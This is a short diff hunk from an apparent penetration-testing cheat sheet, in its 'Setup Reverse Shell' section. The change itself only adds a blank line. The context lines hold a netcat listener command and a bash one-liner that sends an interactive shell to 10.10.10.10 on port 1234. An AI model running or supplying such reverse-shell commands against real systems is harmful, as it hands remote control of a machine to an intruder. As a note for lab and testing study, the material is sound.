@@ -123,6 +123,7 @@ Download and install a package
 
 * Setup Reverse Shell
 > c -lvnp 1234	Start a nc listener on a local port
+
 > bash -c 'bash -i >& /dev/tcp/10.10.10.10/1234 0>&1'	Send a reverse shell from the remote server
 
 
